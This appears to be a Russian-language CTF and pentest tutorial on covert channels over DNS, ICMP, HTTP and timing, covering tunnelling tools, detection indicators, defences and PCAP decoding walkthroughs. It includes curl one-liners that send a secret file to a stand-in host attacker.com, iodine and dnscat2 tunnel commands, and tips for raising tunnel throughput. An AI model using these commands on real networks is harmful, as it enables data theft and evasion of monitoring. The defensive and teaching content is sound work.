Скрытый канал (covert channel) — это способ передавать данные в обход политик безопасности, маскируя их под легитимный трафик. Сеть даёт для этого массу возможностей: DNS, ICMP, HTTP-заголовки, тайминги. В CTF это способ вытащить флаг через «разрешённый» канал, в пентесте — эксфильтрация и C2.

Разберём, что такое covert channel, как строят туннели поверх DNS/ICMP/HTTP и как их находить.

## Виды скрытых каналов

| Канал | Носитель | Пропускная способность | Заметность |
|---|---|---|---|
| DNS | поддомены, TXT, типы записей | низкая | низкая (шумно по объёму) |
| ICMP | payload ping, type/code | средняя | средняя |
| HTTP | заголовки, cookie, тело | высокая | низкая (сливается с вебом) |
| Тайминги | интервалы между пакетами | очень низкая | очень низкая |
| Стеганография L2/L3 | поля заголовков | низкая | средняя |

Чем «обычнее» носитель, тем незаметнее канал: HTTP-трафик на 443 никто не блокирует, а DNS почти всегда разрешён наружу.

## DNS-туннели: как кодируют данные

Данные бьют на чанки и кодируют в base32 (безопасно для имён), затем добавляют как поддомен:

```
A5F3K2QX.tunnel.attacker.com   →  байты, декодированные сервером
```

Сервер отвечает TXT-записями с обратными данными. Инструменты:

```bash
# iodine — полноценный IP-туннель через DNS
iodined -f -c -P pass 10.0.0.1 t.example.com     # сервер
iodine -f -P pass t.example.com                   # клиент → интерфейс dns0

# dnscat2 — C2-канал
ruby dnscat2.rb --dns host=0.0.0.0,port=53,domain=t.example.com

# dns2tcp
dns2tcpd -f /etc/dns2tcpd.conf
```

Индикаторы: аномально много запросов на один домен, длинные поддомены (60+ символов), высокая энтропия, редкие типы (TXT/NULL/CNAME-цепочки), стабильный интервал.

## ICMP-туннели

Ping разрешён почти везде, а payload ICMP Echo Request можно заполнить данными:

```bash
# hans / ptunnel / icmptunnel
# icmptunnel — туннель IP через ICMP
./icmptunnel -s        # сервер (root)
./icmptunnel 10.0.0.1  # клиент

# ручной вариант в Scapy
python3 -c "
from scapy.all import *
send(IP(dst='10.0.0.5')/ICMP()/b'SECRETDATA')
"
```

Поле Type/Code тоже несёт информацию: перебор комбинаций Type/Code — канал на несколько бит на пакет. Детект — по ICMP с payload (обычный ping его не имеет), по размеру и частоте.

## HTTP-инкапсуляция

Самый «сливающийся» канал: данные прячут в заголовках, cookie, теле POST или в path. Пример ручной эксфильтрации:

```bash
# данные в cookie
curl -s -H "Cookie: sess=$(base64 -w0 secret.txt)" https://attacker.com/x

# данные в path
curl -s "https://attacker.com/$(xxd -p secret.bin | head -c 100)"
```

Инструменты: `Cobalt Strike` (HTTP/HTTPS beacon), `Meterpreter` (reverse_http), `DNSCat`, кастомные. Детект — по необычным заголовкам (например, cookie без сессии), по повторяющемуся User-Agent, по beacon-интервалу (jitter).

## Тайминговые каналы

Информацию несут интервалы между пакетами. Два события = бит:

- задержка 100 мс → `0`, задержка 300 мс → `1` (или наоборот);
- чётное число пакетов → `0`, нечётное → `1`;
- порядок пакетов с разными ID.

Пропускная способность крошечная (биты/секунды), но обнаружить такой канал крайне трудно — трафик выглядит как обычная активность. Используется для передачи ключей/меток, а не больших данных. В CTF часто встречается как «скрытая передача в метаданных»: номер пакета, TCP-ISN, поле IP ID, время захвата в PCAP.

## Практический сценарий: эксфильтрация через DNS в CTF

Дан дамп PCAP с подозрительным трафиком. Шаги:

```bash
# 1. найти аномальные запросы
tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head

# 2. выделить домен-туннель (много поддоменов одной зоны)
# 3. извлечь поддомены и декодировать
tshark -r capture.pcap -Y 'dns.qry.name contains "t.example.com"' \
       -T fields -e dns.qry.name | sed 's/\..*//' | base32 -d
```

Если данные в TXT-ответах — извлекайте их через `-e dns.txt`. Если в ICMP — фильтруйте `-Y icmp` и смотрите payload.

## Обнаружение скрытых каналов

- **Статистика объёма**: сколько байт уходит на конкретный домен/IP за период.
- **Энтропия имён**: случайные строки в поддоменах — признак кодирования.
- **Типы и размеры записей**: крупные TXT, NULL-запросы, частые CNAME.
- **ICMP payload**: наличие данных, нестандартные размеры.
- **Beacon-паттерны**: регулярные интервалы, одинаковые размеры, фиксированный jitter.
- **Инструменты**: `Zeek` (DNS/ICMP-логи), `RITA`, `DnsCat`-детекторы, `Suricata`-правила.

## Защита и снижение риска

- Разрешать DNS только к внутренним резолверам (block 53 наружу).
- DPI с энтропийным анализом имён и payload.
- Ограничение размера ICMP и блокировка не-echo типов.
- TLS-инспекция и профилирование beacon-трафика.
- Сегментация: серверам не нужен доступ в интернет по DNS/ICMP напрямую.

## Частые ошибки

- Путать covert channel с шифрованием: канал прячет сам факт передачи, шифрование — содержимое.
- Забывать про пропускную способность: DNS-туннель годится для шелла, но не для гигабайтов.
- Игнорировать «шумность»: активный DNS-туннель легко заметить по объёму, нужен throttle.
- Считать ICMP «безопасным по умолчанию» — payload ping это уже аномалия.

## Что дальше / решение

Для CTF: научитесь быстро вытаскивать поддомены/TXT/ICMP-payload из PCAP (`tshark -T fields` + `base32`/`base64`). Для пентеста: DNS и HTTP — каналы первого выбора при egress-ограничениях. Для защиты: DNS-мониторинг с энтропией имён и жёсткая egress-политика. Практический вывод — «разрешённый протокол» не значит «безопасный»: любой канал можно превратить в транспорт для данных.

## Разобранный пример: декодирование DNS-туннеля из PCAP

Дан `capture.pcap` с подозрительным DNS-трафиком. Разбираем end-to-end.

Шаг 1. Находим доминирующую зону:

```bash
tshark -r capture.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name \
  | awk -F. '{print $(NF-2)"."$(NF-1)"."$NF}' | sort | uniq -c | sort -rn | head
# 4821 t.example.com
```

Шаг 2. Видим длинные поддомены — признак кодирования:

```bash
tshark -r capture.pcap -Y 'dns.qry.name contains "t.example.com"' \
  -T fields -e dns.qry.name | head -3
# MFRGGZDFMZTWQ2LK.t.example.com
# MFRGGZDFMZTWQ2LL.t.example.com
```

Шаг 3. Извлекаем левую метку и декодируем base32:

```bash
tshark -r capture.pcap -Y 'dns.qry.name contains "t.example.com"' \
  -T fields -e dns.qry.name | cut -d. -f1 | tr -d '\n' | base32 -d
# ...secret data exfiltrated...
```

Шаг 4. Если данные шли в ответах (TXT), берём их иначе:

```bash
tshark -r capture.pcap -Y 'dns.txt' -T fields -e dns.txt | tr -d '\n' | base64 -d
```

Такой конвейер `tshark -T fields` → `cut` → `base32/base64 -d` решает большинство DNS-туннельных CTF-задач.

## Разобранный пример: ICMP-эксфильтрация

```bash
# найти ICMP с payload (обычный ping payload пуст)
tshark -r capture.pcap -Y 'icmp.type==8 && data.len>0' -T fields -e data | head
# 536563726574

python3 -c "print(bytes.fromhex('536563726574').decode())"
# Secret
```

Склеиваем payload всех echo-request по порядку и декодируем — типичный приём.

## Чек-лист детекта скрытых каналов

1. Топ доменов по числу запросов и по объёму данных.
2. Средняя длина поддомена и энтропия меток.
3. Доля редких типов записей (TXT, NULL, CNAME-цепочки).
4. ICMP-пакеты с непустым payload и нестандартными размерами.
5. Регулярность beacon-интервалов (фиксированный jitter, одинаковые размеры).
6. Разница «объём запросов» vs «объём ответов» на конкретный домен.

## Кодирование полезной нагрузки: base32, base64, hex и почему это важно

Выбор кодировки определяет, сколько байт реально уедет в канал и как легко канал заметить. DNS-метки чувствительны к регистру и запрещённым символам, поэтому в поддомены кладут **base32** (алфавит `A-Z2-7`, без `=`-padding, только `a-z0-9`). Base64 содержит `+`, `/` и `=` — они ломают DNS-имя, поэтому его используют для TXT-записей, а не для меток. Hex даёт ровно 2 символа на байт и прекрасно читается человеком, но вдвое раздувает объём.

| Кодировка | Символов на 3 байта | Алфавит | Годится для DNS-метки |
|---|---|---|---|
| base32 | 8 | A-Z2-7 | да |
| base64 | 4 | A-Za-z0-9+/= | нет (`+`/`/`/`=`) |
| base64url | 4 | A-Za-z0-9-_ | почти (нужен регистронезависимый резолвер) |
| hex | 6 | 0-9a-f | да, но в 1.5× больше base32 |

Практический конвейер для CTF: собрать метки в порядке времени, склеить, декодировать нужным кодеком, а если результат «мусорный» — попробовать другую кодировку или XOR. Часто поверх кодировки лежит ещё и шифрование, и тогда без ключа (например, из другого артефакта) данные не прочитать.

```bash
# собрать левые метки в порядке появления и декодировать
tshark -r cap.pcap -Y 'dns.qry.name contains "c2.evil.com"' \
  -T fields -e dns.qry.name | cut -d. -f1 | tr -d '\n' | base32 -d > out.bin
file out.bin && xxd out.bin | head
# если base32 не сошёлся — проверить hex и base64
tshark -r cap.pcap -Y 'dns.qry.name contains "c2.evil.com"' \
  -T fields -e dns.qry.name | cut -d. -f1 | tr -d '\n' | xxd -r -p | head
```

## Пропускная способность и надёжность скрытого канала

У скрытого канала есть фундаментальный компромисс: **чем незаметнее, тем медленнее**. DNS-запрос имеет предел метки 63 байта и всего имени 253 байта, поэтому даже при 100 запросах в секунду реальная скорость — единицы килобайт в секунду. ICMP ограничен MTU (обычно ~1400 байт полезной нагрузки на пакет). HTTP-канал поверх легитимного CDN даёт наибольшую скорость, но требует постоянного соединения и легко профилируется по beacon-интервалу.

Практические приёмы повышения пропускной способности:

- **Несколько записей в одном запросе**: `A`, `AAAA`, `TXT`, `MX` в одном разрешении.
- **Параллельные поддомены**: нумерация `1.`, `2.`, `3.` позволяет резолверу отправлять запросы конкурентно.
- **Обратный поток**: ответы сервера (TXT, CNAME) несут данные к клиенту, удваивая канал.
- **Адаптивный throttle**: задержка между запросами, чтобы не превышать baseline домена.

Для защиты критично не только «блокировать канал», но и **держать baseline**: сколько запросов в секунду к каждому домену, средняя длина имени, распределение типов записей. Аномалия — это отклонение от базовой линии, а не абсолютное значение.

## Расширенный чек-лист: что искать в PCAP по слоям

1. **L7 (DNS)**: топ зон по числу запросов, средняя длина метки, энтропия (Shannon), доля TXT/NULL/CNAME.
2. **L7 (HTTP)**: повторяющийся `User-Agent`, cookie без `Domain`, POST с base64-подобным телом, фиксированный интервал между запросами.
3. **L4**: постоянные размеры TCP-сегментов, малый window, отсутствие ретрансмиссий при непрерывной передаче.
4. **L3 (ICMP)**: payload, непустой у echo, асимметрия request/reply, размер выше 100 байт.
5. **L3 (IP)**: поля ID/TOS, используемые как storage-канал; необычные флаги фрагментации.
6. **L2**: размер кадра как код, поля `reserved` в заголовке, тайминги между кадрами.

```bash
# энтропия меток: высокая (>3.5 бит/символ) — признак кодирования
tshark -r cap.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name | cut -d. -f1 | \
python3 -c '
import sys, math, collections
for l in sys.stdin.read().split():
    c = collections.Counter(l); n = len(l)
    if n:
        h = -sum(v/n*math.log2(v/n) for v in c.values())
        print(round(h, 2), l)
' | sort -rn | head
```
